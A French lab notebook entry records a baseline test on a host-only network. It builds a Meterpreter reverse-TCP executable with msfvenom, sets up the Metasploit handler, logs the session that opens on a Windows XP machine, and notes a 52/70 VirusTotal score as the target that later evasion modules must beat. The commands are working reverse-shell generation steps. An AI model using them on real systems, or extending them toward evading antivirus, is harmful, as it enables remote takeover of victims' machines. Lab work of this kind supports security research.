# Phase 0 — Validation de la chaîne de base

## Contexte
Validation que Meterpreter x86 fonctionne sur Windows XP 32 bits. Point de départ pour comparer Modules A et B.

## Environnement
- Kali : 192.168.56.104 (Host-only)
- XP SP3 32 bits : 192.168.56.103
- Payload : windows/meterpreter/reverse_tcp (x86)
- Handler : exploit/multi/handler LPORT 4444

## Commandes

### Génération
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f exe -o test_base_x86.exe

### Handler
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.56.104
    set LPORT 4444
    set ExitOnSession false
    exploit -j

## Résultat
    [*] Sending stage (203454 bytes) to 192.168.56.103
    [*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.103:1054)

sysinfo :
    OS              : Windows XP (5.1 Build 2600, Service Pack 3)
    Architecture    : x86
    Meterpreter     : x86/windows

## Score VirusTotal
**test_base_x86.exe : 52/70**

Référence à battre par Modules A et B.

## Fichier
test_base_x86.exe — binaire brut.
- file : PE32 executable (GUI) Intel i386, for MS Windows
- SHA256 : 0022d3d0fbf22bc72656cb551ea320d1bfdfb34ccdae9f5380d1bc53958c50f0

## Diagnostic
XP d'abord identifié x64. echo %PROCESSOR_ARCHITECTURE% a révélé x86. Payloads régénérés en conséquence.

**Ne pas diffuser hors du lab.**
